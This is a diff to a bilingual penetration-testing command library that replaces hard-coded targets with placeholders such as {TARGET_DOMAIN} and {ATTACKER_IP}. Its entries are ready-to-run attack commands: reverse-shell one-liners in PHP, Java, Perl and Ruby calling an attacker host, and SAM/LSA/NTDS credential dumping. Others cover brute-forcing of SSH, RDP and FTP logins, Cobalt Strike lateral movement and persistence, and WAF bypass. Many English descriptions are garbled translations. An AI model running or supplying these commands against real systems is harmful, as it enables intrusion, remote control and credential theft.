+        command: 'dnsenum --enum -f /usr/share/dnsenum/dns.txt --threads 10 {TARGET_DOMAIN}',
         description: { zh: '使用字典暴力枚举子域名', en: 'Brute-force subdomain enumeration using a dictionary' },
         platform: 'all'
       },
       {
         name: { zh: '指定DNS服务器', en: 'Specify DNS Server' },
-        command: 'dnsenum --dnsserver 8.8.8.8 target.com',
+        command: 'dnsenum --dnsserver 8.8.8.8 {TARGET_DOMAIN}',
         description: { zh: '指定DNS服务器进行枚举', en: 'Specify DNS Server perform Enumeration' },
         platform: 'all'
       }
@@ -1934,7 +1934,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '全源搜集', en: 'All-Source Collection' },
-        command: 'theHarvester -d target.com -b all -l 500',
+        command: 'theHarvester -d {TARGET_DOMAIN} -b all -l 500',
         description: { zh: '使用所有数据源收集信息', en: 'UseallDataSourceCollectInformation' },
         syntaxBreakdown: [
           { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
@@ -1945,13 +1945,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定数据源', en: 'Specify Data Source' },
-        command: 'theHarvester -d target.com -b google,bing,linkedin,shodan',
+        command: 'theHarvester -d {TARGET_DOMAIN} -b google,bing,linkedin,shodan',
         description: { zh: '使用指定数据源搜集', en: 'Gather using specified data sources' },
         platform: 'all'
       },
       {
         name: { zh: '输出报告', en: 'Output Report' },
-        command: 'theHarvester -d target.com -b all -f report.html',
+        command: 'theHarvester -d {TARGET_DOMAIN} -b all -f report.html',
         description: { zh: '生成HTML格式报告', en: 'GenerateHTMLFormatReport' },
         platform: 'all'
       }
@@ -1967,7 +1967,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础扫描', en: 'Basic Scan' },
-        command: 'nikto -h https://target.com',
+        command: 'nikto -h https://{TARGET_DOMAIN}',
         description: { zh: '对目标进行全面Web漏洞扫描', en: 'Perform a comprehensive web vulnerability scan on the target' },
         syntaxBreakdown: [
           { part: 'nikto', explanation: { zh: 'Web服务器漏洞扫描器', en: 'WebServerVulnerabilityScanTool' }, type: 'command' },
@@ -1977,25 +1977,25 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定端口和SSL', en: 'Specify Port and SSL' },
-        command: 'nikto -h target.com -p 8443 -ssl',
+        command: 'nikto -h {TARGET_DOMAIN} -p 8443 -ssl',
         description: { zh: '扫描HTTPS服务', en: 'ScanHTTPSService' },
         platform: 'all'
       },
       {
         name: { zh: '使用代理', en: 'Using Proxy' },
-        command: 'nikto -h target.com -useproxy http://127.0.0.1:8080',
+        command: 'nikto -h {TARGET_DOMAIN} -useproxy http://127.0.0.1:8080',
         description: { zh: '通过Burp代理进行扫描', en: 'throughBurpProxy perform Scan' },
         platform: 'all'
       },
       {
         name: { zh: '指定测试插件', en: 'Specify Test Plugin' },
-        command: 'nikto -h target.com -Plugins "apache_expect_xss;outdated"',
+        command: 'nikto -h {TARGET_DOMAIN} -Plugins "apache_expect_xss;outdated"',
         description: { zh: '仅运行指定的测试插件', en: 'OnlyRunspecified TestPlugin' },
         platform: 'all'
       },
       {
         name: { zh: '输出报告', en: 'Output Report' },
-        command: 'nikto -h target.com -o report.html -Format htm',
+        command: 'nikto -h {TARGET_DOMAIN} -o report.html -Format htm',
         description: { zh: '输出HTML格式报告', en: 'OutputHTMLFormatReport' },
         platform: 'all'
       }
@@ -2011,13 +2011,13 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '自动扫描', en: 'Auto Scan' },
-        command: 'zap-cli quick-scan -s all -r https://target.com\n# 或使用API\ncurl "http://localhost:8080/JSON/ascan/action/scan/?url=https://target.com"',
+        command: 'zap-cli quick-scan -s all -r https://{TARGET_DOMAIN}\n# 或使用API\ncurl "http://localhost:8080/JSON/ascan/action/scan/?url=https://{TARGET_DOMAIN}"',
         description: { zh: '快速自动化漏洞扫描', en: 'Fast automated vulnerability scan' },
         platform: 'all'
       },
       {
         name: { zh: 'API扫描', en: 'API Scan' },
-        command: 'zap-api-scan.py -t https://target.com/api/swagger.json -f openapi',
+        command: 'zap-api-scan.py -t https://{TARGET_DOMAIN}/api/swagger.json -f openapi',
         description: { zh: '根据OpenAPI规范扫描API', en: 'Scan APIs based on OpenAPI specification' },
         platform: 'all'
       },
@@ -2029,7 +2029,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'Docker自动化', en: 'Docker Automation' },
-        command: 'docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://target.com -r report.html',
+        command: 'docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://{TARGET_DOMAIN} -r report.html',
         description: { zh: '使用Docker容器化运行基线扫描', en: 'UseDockerContainer-izeRunBaselineScan' },
         platform: 'all'
       }
@@ -2045,7 +2045,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'GET参数发现', en: 'GET Parameter Discovery' },
-        command: 'arjun -u https://target.com/page',
+        command: 'arjun -u https://{TARGET_DOMAIN}/page',
         description: { zh: '发现隐藏的GET参数', en: 'DiscoverHidden GETParameter' },
         syntaxBreakdown: [
           { part: 'arjun', explanation: { zh: 'HTTP参数发现工具', en: 'HTTPParameterDiscoverTools' }, type: 'command' },
@@ -2055,13 +2055,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'POST参数发现', en: 'POST Parameter Discovery' },
-        command: 'arjun -u https://target.com/api -m POST --include="Content-Type: application/json"',
+        command: 'arjun -u https://{TARGET_DOMAIN}/api -m POST --include="Content-Type: application/json"',
         description: { zh: '发现POST请求的隐藏参数', en: 'DiscoverPOSTRequest HiddenParameter' },
         platform: 'all'
       },
       {
         name: { zh: '自定义字典', en: 'Custom Wordlist' },
-        command: 'arjun -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt',
+        command: 'arjun -u https://{TARGET_DOMAIN} -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt',
         description: { zh: '使用自定义参数字典', en: 'UseCustomParameterDictionary' },
         platform: 'all'
       },
@@ -2083,7 +2083,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '目录Fuzz', en: 'Directory Fuzz' },
-        command: 'wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 https://target.com/FUZZ',
+        command: 'wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 https://{TARGET_DOMAIN}/FUZZ',
         description: { zh: '目录暴力破解，隐藏404', en: 'DirectoryBrute Force, Hidden404' },
         syntaxBreakdown: [
           { part: '-c', explanation: { zh: '彩色输出', en: 'Colorized output' }, type: 'parameter' },
@@ -2095,19 +2095,19 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '参数Fuzz', en: 'Parameter Fuzz' },
-        command: 'wfuzz -c -z file,params.txt --hh 0 "https://target.com/api?FUZZ=test"',
+        command: 'wfuzz -c -z file,params.txt --hh 0 "https://{TARGET_DOMAIN}/api?FUZZ=test"',
         description: { zh: '参数名Fuzz，隐藏空响应', en: 'ParameternameFuzz, HiddenEmptyResponse' },
         platform: 'all'
       },
       {
         name: { zh: '认证爆破', en: 'Authentication Brute Force' },
-        command: 'wfuzz -c -z file,users.txt -z file,passwords.txt --hc 403 -d "user=FUZZ&pass=FUZ2Z" https://target.com/login',
+        command: 'wfuzz -c -z file,users.txt -z file,passwords.txt --hc 403 -d "user=FUZZ&pass=FUZ2Z" https://{TARGET_DOMAIN}/login',
         description: { zh: '双字典组合爆破登录', en: 'Dual-dictionary combined brute-force login' },
         platform: 'all'
       },
       {
         name: { zh: '子域名Fuzz', en: 'Subdomain Fuzz' },
-        command: 'wfuzz -c -z file,subs.txt --hc 404 -H "Host: FUZZ.target.com" https://target.com',
+        command: 'wfuzz -c -z file,subs.txt --hc 404 -H "Host: FUZZ.{TARGET_DOMAIN}" https://{TARGET_DOMAIN}',
         description: { zh: 'Host头注入方式枚举子域名', en: 'HostHeaderInjectionMethodEnumerate Subdomains' },
         platform: 'all'
       }
@@ -2123,7 +2123,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '自动检测', en: 'Auto Detection' },
-        command: 'commix --url="https://target.com/page?cmd=test"',
+        command: 'commix --url="https://{TARGET_DOMAIN}/page?cmd=test"',
         description: { zh: '自动检测命令注入点', en: 'Auto DetectionCommand Injectionpoint' },
         syntaxBreakdown: [
           { part: 'commix', explanation: { zh: '命令注入自动化工具', en: 'Command InjectionAutomatic-izeTools' }, type: 'command' },
@@ -2133,19 +2133,19 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定参数', en: 'Specify Parameter' },
-        command: 'commix --url="https://target.com/api" --data="host=INJECT_HERE" -p host',
+        command: 'commix --url="https://{TARGET_DOMAIN}/api" --data="host=INJECT_HERE" -p host',
         description: { zh: '指定POST参数进行注入测试', en: 'specifiedPOSTParameter perform InjectionTest' },
         platform: 'all'
       },
       {
         name: { zh: '获取Shell', en: 'Get Shell' },
-        command: 'commix --url="https://target.com/page?ip=test" --os-cmd="id"\ncommix --url="https://target.com/page?ip=test" --os-shell',
+        command: 'commix --url="https://{TARGET_DOMAIN}/page?ip=test" --os-cmd="id"\ncommix --url="https://{TARGET_DOMAIN}/page?ip=test" --os-shell',
         description: { zh: '执行系统命令或获取交互式Shell', en: 'Execute system commands or obtain an interactive shell' },
         platform: 'all'
       },
       {
         name: { zh: '绕过WAF', en: 'Bypass WAF' },
-        command: 'commix --url="https://target.com/page?cmd=test" --tamper=base64encode --technique=t',
+        command: 'commix --url="https://{TARGET_DOMAIN}/page?cmd=test" --tamper=base64encode --technique=t',
         description: { zh: '使用编码绕过和时间盲注技术', en: 'UseEncoding Bypass and Time-Based Blind InjectionTechnique' },
         platform: 'all'
       }
@@ -2161,7 +2161,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'URL扫描', en: 'URL Scan' },
-        command: 'dalfox url "https://target.com/search?q=test"',
+        command: 'dalfox url "https://{TARGET_DOMAIN}/search?q=test"',
         description: { zh: '扫描单个URL的XSS漏洞', en: 'ScansingleURL XSSVulnerability' },
         syntaxBreakdown: [
           { part: 'dalfox', explanation: { zh: 'XSS漏洞扫描工具', en: 'XSSVulnerabilityScanTools' }, type: 'command' },
@@ -2177,13 +2177,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '自定义Payload', en: 'Custom Payload' },
-        command: 'dalfox url "https://target.com/q=test" --custom-payload payloads.txt --waf-evasion',
+        command: 'dalfox url "https://{TARGET_DOMAIN}/q=test" --custom-payload payloads.txt --waf-evasion',
         description: { zh: '使用自定义Payload并启用WAF绕过', en: 'UseCustom Payload and EnableWAF Bypass' },
         platform: 'all'
       },
       {
         name: 'Blind XSS',
-        command: 'dalfox url "https://target.com/q=test" --blind https://your-xss-hunter.com',
+        command: 'dalfox url "https://{TARGET_DOMAIN}/q=test" --blind https://your-xss-hunter.com',
         description: { zh: '使用Blind XSS回调检测', en: 'UseBlind XSSCallbackDetection' },
         platform: 'all'
       }
@@ -2199,25 +2199,25 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '基础扫描', en: 'Basic Scan' },
-        command: 'python3 xsstrike.py -u "https://target.com/search?q=test"',
+        command: 'python3 xsstrike.py -u "https://{TARGET_DOMAIN}/search?q=test"',
         description: { zh: '扫描反射型XSS', en: 'ScanReflected XSS' },
         platform: 'all'
       },
       {
         name: { zh: 'POST方式', en: 'POST Method' },
-        command: 'python3 xsstrike.py -u "https://target.com/comment" --data "content=test" --method POST',
+        command: 'python3 xsstrike.py -u "https://{TARGET_DOMAIN}/comment" --data "content=test" --method POST',
         description: { zh: '测试POST参数的XSS', en: 'TestPOSTParameter XSS' },
         platform: 'all'
       },
       {
         name: { zh: '模糊测试', en: 'Fuzz Testing' },
-        command: 'python3 xsstrike.py -u "https://target.com/q=test" --fuzzer',
+        command: 'python3 xsstrike.py -u "https://{TARGET_DOMAIN}/q=test" --fuzzer',
         description: { zh: '使用模糊测试模式发现过滤规则', en: 'UseFuzz TestingModeDiscoverFilterRule' },
         platform: 'all'
       },
       {
         name: { zh: '爬虫模式', en: 'Crawler Mode' },
-        command: 'python3 xsstrike.py -u "https://target.com" --crawl -l 3',
+        command: 'python3 xsstrike.py -u "https://{TARGET_DOMAIN}" --crawl -l 3',
         description: { zh: '爬取3层深度的所有页面并测试XSS', en: 'Crawl all pages 3 levels deep and test for XSS' },
         platform: 'all'
       }
@@ -2270,7 +2270,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '自动检测', en: 'Auto Detection' },
-        command: 'python3 smuggler.py -u https://target.com',
+        command: 'python3 smuggler.py -u https://{TARGET_DOMAIN}',
         description: { zh: '自动检测HTTP请求走私漏洞', en: 'Auto DetectionHTTPRequest SmugglingVulnerability' },
         syntaxBreakdown: [
           { part: 'smuggler.py', explanation: { zh: 'HTTP走私检测脚本', en: 'HTTPSmugglingDetectionScript' }, type: 'command' },
@@ -2279,7 +2279,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '指定技术', en: 'Specify Technique' },
-        command: 'python3 smuggler.py -u https://target.com -t CL.TE',
+        command: 'python3 smuggler.py -u https://{TARGET_DOMAIN} -t CL.TE',
         description: { zh: '测试CL.TE类型的请求走私', en: 'TestCL.TEType Request Smuggling' },
         platform: 'all'
       },
@@ -2310,7 +2310,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '全自动攻击', en: 'Full Auto Attack' },
-        command: 'jwt_tool -t https://target.com/api -rh "Authorization: Bearer eyJ..." -M at',
+        command: 'jwt_tool -t https://{TARGET_DOMAIN}/api -rh "Authorization: Bearer eyJ..." -M at',
         description: { zh: '自动尝试所有已知JWT攻击', en: 'AutomaticAttemptallKnownJWTAttack' },
         platform: 'all'
       },
@@ -2344,19 +2344,19 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '自省查询', en: 'Introspection Query' },
-        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x dump_schema',
+        command: 'python3 graphqlmap.py -u https://{TARGET_DOMAIN}/graphql --method POST -x dump_schema',
         description: { zh: '通过自省查询导出完整Schema', en: 'throughIntrospection QueryExportcompleteSchema' },
         platform: 'all'
       },
       {
         name: { zh: '字段枚举', en: 'Field Enumeration' },
-        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x enum',
+        command: 'python3 graphqlmap.py -u https://{TARGET_DOMAIN}/graphql --method POST -x enum',
         description: { zh: '枚举所有可用的Query/Mutation字段', en: 'Enumerate all available Query/Mutation fields' },
         platform: 'all'
       },
       {
         name: { zh: 'SQL注入', en: 'SQLInjection' },
-        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x nosqli',
+        command: 'python3 graphqlmap.py -u https://{TARGET_DOMAIN}/graphql --method POST -x nosqli',
         description: { zh: '测试GraphQL参数的注入漏洞', en: 'TestGraphQLParameter InjectionVulnerability' },
         platform: 'all'
       }
@@ -2372,7 +2372,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '连接WebDAV', en: 'Connect WebDAV' },
-        command: 'cadaver https://target.com/webdav/',
+        command: 'cadaver https://{TARGET_DOMAIN}/webdav/',
         description: { zh: '连接到WebDAV服务器', en: 'Connection to WebDAVServer' },
         platform: 'linux'
       },
@@ -2641,7 +2641,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '常用Beacon命令', en: 'Common Beacon Commands' },
-        command: '# 基础信息\nwhoami\nshell ipconfig\ngetuid\n\n# 横向移动\njump psexec target_ip SMB_listener\njump winrm target_ip HTTP_listener\n\n# 凭证获取\nhashdump\nlogonpasswords\n\n# 持久化\npersist-service\npersist-registry',
+        command: '# 基础信息\nwhoami\nshell ipconfig\ngetuid\n\n# 横向移动\njump psexec {TARGET_IP} SMB_listener\njump winrm {TARGET_IP} HTTP_listener\n\n# 凭证获取\nhashdump\nlogonpasswords\n\n# 持久化\npersist-service\npersist-registry',
         description: { zh: '获取Beacon后的常用后渗透命令', en: 'ObtainBeaconAfter CommonPost-Exploitation Commands' },
         platform: 'windows'
       },
@@ -2725,7 +2725,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
-        command: 'medusa -h target_ip -u admin -P passwords.txt -M ssh -t 4',
+        command: 'medusa -h {TARGET_IP} -u admin -P passwords.txt -M ssh -t 4',
         description: { zh: '4线程SSH密码暴力破解', en: '4threadSSHPasswordBrute Force' },
         syntaxBreakdown: [
           { part: 'medusa', explanation: { zh: '并行网络登录破解工具', en: 'and lineNetworkLoginCrackTools' }, type: 'command' },
@@ -2739,13 +2739,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
-        command: 'medusa -h target_ip -U users.txt -P passwords.txt -M rdp -t 2',
+        command: 'medusa -h {TARGET_IP} -U users.txt -P passwords.txt -M rdp -t 2',
         description: { zh: 'RDP远程桌面密码破解', en: 'RDP remote desktop password cracking' },
         platform: 'all'
       },
       {
         name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
-        command: 'medusa -h target_ip -U users.txt -P passwords.txt -M ftp -f',
+        command: 'medusa -h {TARGET_IP} -U users.txt -P passwords.txt -M ftp -f',
         description: { zh: 'FTP破解(找到密码后停止)', en: 'FTPCrack(Find to PasswordAfterStop)' },
         platform: 'all'
       },
@@ -2767,7 +2767,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
-        command: 'ncrack -vv -U users.txt -P passwords.txt ssh://target_ip',
+        command: 'ncrack -vv -U users.txt -P passwords.txt ssh://{TARGET_IP}',
         description: { zh: 'SSH认证暴力破解', en: 'SSHAuthenticationBrute Force' },
         syntaxBreakdown: [
           { part: 'ncrack', explanation: { zh: '高速网络认证破解工具', en: 'High-speed network authentication cracking tool' }, type: 'command' },
@@ -2800,7 +2800,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
-        command: 'crowbar -b rdp -s target_ip/32 -u admin -C passwords.txt -n 2',
+        command: 'crowbar -b rdp -s {TARGET_IP}/32 -u admin -C passwords.txt -n 2',
         description: { zh: 'RDP密码暴力破解(2线程)', en: 'RDPPasswordBrute Force(2thread)' },
         syntaxBreakdown: [
           { part: '-b rdp', explanation: { zh: '指定协议类型', en: 'specifiedProtocolType' }, type: 'parameter' },
@@ -2811,13 +2811,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'SSH密钥爆破', en: 'SSH Key Brute Force' },
-        command: 'crowbar -b sshkey -s target_ip/32 -u root -k /path/to/keys/',
+        command: 'crowbar -b sshkey -s {TARGET_IP}/32 -u root -k /path/to/keys/',
         description: { zh: '尝试多个SSH私钥登录', en: 'AttemptMultipleSSHprivate keyLogin' },
         platform: 'all'
       },
       {
         name: { zh: 'VNC爆破', en: 'VNC Brute Force' },
-        command: 'crowbar -b vnckey -s target_ip/32 -p password -k /path/to/keys/',
+        command: 'crowbar -b vnckey -s {TARGET_IP}/32 -p password -k /path/to/keys/',
         description: { zh: 'VNC认证暴力破解', en: 'VNCAuthenticationBrute Force' },
         platform: 'all'
       }
@@ -2833,7 +2833,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
-        command: 'patator ssh_login host=target_ip user=FILE0 password=FILE1 0=users.txt 1=passwords.txt',
+        command: 'patator ssh_login host={TARGET_IP} user=FILE0 password=FILE1 0=users.txt 1=passwords.txt',
         description: { zh: 'SSH登录暴力破解', en: 'SSHLoginBrute Force' },
         syntaxBreakdown: [
           { part: 'ssh_login', explanation: { zh: '使用SSH登录模块', en: 'UseSSHLoginModule' }, type: 'command' },
@@ -2843,13 +2843,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'HTTP表单爆破', en: 'HTTP Form Brute Force' },
-        command: 'patator http_fuzz url="https://target.com/login" method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt -x ignore:fgrep="Login failed"',
+        command: 'patator http_fuzz url="https://{TARGET_DOMAIN}/login" method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt -x ignore:fgrep="Login failed"',
         description: { zh: 'HTTP登录表单暴力破解', en: 'HTTPLogintableSingleBrute Force' },
         platform: 'all'
       },
       {
         name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
-        command: 'patator ftp_login host=target_ip user=admin password=FILE0 0=passwords.txt',
+        command: 'patator ftp_login host={TARGET_IP} user=admin password=FILE0 0=passwords.txt',
         description: { zh: 'FTP密码暴力破解', en: 'FTPPasswordBrute Force' },
         platform: 'all'
       }
@@ -2948,13 +2948,13 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '命令执行', en: 'Command Execution' },
-        command: 'nxc smb target_ip -u admin -p password -x "whoami"\nnxc winrm target_ip -u admin -p password -X "Get-Process"',
+        command: 'nxc smb {TARGET_IP} -u admin -p password -x "whoami"\nnxc winrm {TARGET_IP} -u admin -p password -X "Get-Process"',
         description: { zh: '通过SMB/WinRM执行命令', en: 'throughSMB/WinRMExecute Command' },
         platform: 'all'
       },
       {
         name: { zh: '提取凭证', en: 'Extract Credentials' },
-        command: 'nxc smb target_ip -u admin -p password --sam\nnxc smb target_ip -u admin -p password --lsa\nnxc smb target_ip -u admin -p password --ntds',
+        command: 'nxc smb {TARGET_IP} -u admin -p password --sam\nnxc smb {TARGET_IP} -u admin -p password --lsa\nnxc smb {TARGET_IP} -u admin -p password --ntds',
         description: { zh: '提取SAM/LSA/NTDS中的凭证', en: 'ExtractSAM/LSA/NTDSMiddle Credentials' },
         platform: 'all'
       }
@@ -2980,7 +2980,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '目标机连接', en: 'Target Connection' },
-        command: './agent -connect attacker_ip:11601 -ignore-cert',
+        command: './agent -connect {ATTACKER_IP}:11601 -ignore-cert',
         description: { zh: '在目标机运行Agent连接回攻击机', en: 'Run agent on target to connect back to the attacker' },
         platform: 'all'
       },
@@ -3138,7 +3138,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: 'Shadow Credentials',
-        command: 'certipy shadow auto -u user@domain.com -p password -account target_user',
+        command: 'certipy shadow auto -u user@domain.com -p password -account {USERNAME}',
         description: { zh: 'Shadow Credentials攻击获取目标用户凭证', en: 'Shadow CredentialsAttackObtainTargetUsersCredentials' },
         platform: 'all'
       }
@@ -3345,7 +3345,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: '远程执行', en: 'Remote Execution' },
-        command: 'wmic /node:target_ip /user:admin /password:pass process call create "cmd.exe /c whoami"',
+        command: 'wmic /node:{TARGET_IP} /user:{USERNAME} /password:{PASSWORD} process call create "cmd.exe /c whoami"',
         description: { zh: '远程WMI命令执行', en: 'RemoteWMICommand Execution' },
         platform: 'windows'
       },
@@ -3410,7 +3410,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '连接AD', en: 'Connect to AD' },
-        command: 'ADExplorer.exe\n# 输入DC地址: dc.domain.com\n# 输入凭证: domain\\user / password\n# 或使用当前域凭证直连',
+        command: 'ADExplorer.exe\n# 输入DC地址: dc.domain.com\n# 输入凭证: domain\\user / {PASSWORD}\n# 或使用当前域凭证直连',
         description: { zh: '连接到Active Directory进行浏览', en: 'Connect to Active Directory for browsing' },
         platform: 'windows'
       },
@@ -3520,7 +3520,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'exec方式', en: 'exec Method' },
-        command: 'php -r \'$sock=fsockopen("attacker_ip",4444);exec("sh <&3 >&3 2>&3");\'',
+        command: 'php -r \'$sock=fsockopen("{ATTACKER_IP}",4444);exec("sh <&3 >&3 2>&3");\'',
         description: { zh: '使用exec函数反弹Shell', en: 'UseexecFunctionReverse Shell' },
         syntaxBreakdown: [
           { part: 'fsockopen', explanation: { zh: '创建TCP连接', en: 'CreateTCPConnection' }, type: 'command' },
@@ -3530,7 +3530,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'proc_open方式', en: 'proc_open Method' },
-        command: 'php -r \'$sock=fsockopen("attacker_ip",4444);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
+        command: 'php -r \'$sock=fsockopen("{ATTACKER_IP}",4444);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
         description: { zh: '使用proc_open创建交互式Shell', en: 'Create an interactive shell using proc_open' },
         platform: 'linux'
       },
@@ -3557,7 +3557,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: 'Runtime方式', en: 'Runtime Method' },
-        command: 'Runtime rt = Runtime.getRuntime();\nString[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"};\nrt.exec(cmd);',
+        command: 'Runtime rt = Runtime.getRuntime();\nString[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1"};\nrt.exec(cmd);',
         description: { zh: 'Java Runtime执行反弹Shell', en: 'Java RuntimeExecuteReverse Shell' },
         platform: 'linux'
       },
@@ -3589,13 +3589,13 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '标准反弹', en: 'Standard Reverse' },
-        command: 'perl -e \'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\'',
+        command: 'perl -e \'use Socket;$i="{ATTACKER_IP}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\'',
         description: { zh: 'Perl标准反弹Shell', en: 'Standard Perl reverse shell' },
         platform: 'all'
       },
       {
         name: { zh: 'Perl无fork', en: 'Perl No-fork' },
-        command: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
+        command: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ATTACKER_IP}:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
         description: { zh: 'Perl IO模块方式', en: 'Perl IOModuleMethod' },
         platform: 'linux'
       }
@@ -3610,7 +3610,7 @@ export const toolCommands: ToolCommand[] = [
     commands: [
       {
         name: { zh: '标准反弹', en: 'Standard Reverse' },
-        command: 'ruby -rsocket -e\'f=TCPSocket.open("attacker_ip",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+        command: 'ruby -rsocket -e\'f=TCPSocket.open("{ATTACKER_IP}",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
         description: { zh: 'Ruby标准反弹Shell', en: 'Standard Ruby reverse shell' },
         syntaxBreakdown: [
           { part: '-rsocket', explanation: { zh: '加载Socket库', en: 'LoadSocketdatabase' }, type: 'parameter' },
@@ -3620,7 +3620,7 @@ export const toolCommands: ToolCommand[] = [
       },
       {
         name: { zh: 'Windows版', en: 'Windows Version' },
-        command: 'ruby -rsocket -e \'c=TCPSocket.new("attacker_ip",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
+        command: 'ruby -rsocket -e \'c=TCPSocket.new("{ATTACKER_IP}",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
         description: { zh: 'Windows兼容版本', en: 'Windows-compatible version' },
         platform: 'windows'
       }
